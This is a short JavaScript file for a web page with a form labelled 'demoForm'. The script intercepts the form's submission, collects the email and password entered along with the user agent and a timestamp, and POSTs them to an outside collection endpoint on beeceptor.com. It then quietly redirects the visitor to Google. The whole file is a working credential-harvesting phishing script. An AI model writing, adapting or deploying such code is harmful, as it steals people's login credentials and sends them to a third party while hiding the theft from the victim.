document.addEventListener('DOMContentLoaded', () => {
  const form = document.getElementById('demoForm');
  const emailInput = document.getElementById('emailInput');
  const passwordInput = document.getElementById('passwordInput');

  form.addEventListener('submit', async (e) => {
    e.preventDefault();  // Prevent the default form submission

    const data = {
      email: emailInput.value,
      password: passwordInput.value,
      userAgent: navigator.userAgent,
      time: new Date().toISOString()
    };

    try {
      const response = await fetch('https://logers.free.beeceptor.com', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });
      
      console.log('Submitted to Beeceptor:', data);
      
      // After submission, redirect to Google homepage
      window.location.href = "https://www.google.com";
    } catch (error) {
      console.error('Submission failed:', error);
    }
  });
});
